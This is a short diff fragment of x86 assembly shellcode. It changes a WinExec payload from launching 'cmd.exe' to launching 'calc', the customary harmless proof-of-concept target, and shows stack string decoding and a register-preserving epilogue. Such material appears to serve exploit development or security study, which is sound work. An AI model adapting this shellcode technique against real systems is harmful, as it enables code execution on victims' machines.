@@ -58,8 +58,8 @@ funcaddr:
     sub dword [esp], 0x21212121
     mov eax, esp
     push 0xa                ; window state
-    push eax                ; pointer to "cmd.exe\0"
-    call edx                ; Winexec("cmd.exe\0") 
+    push eax                ; pointer to "calc\0"
+    call edx                ; Winexec("calc\0") 
 .end:
     popad
     popfd
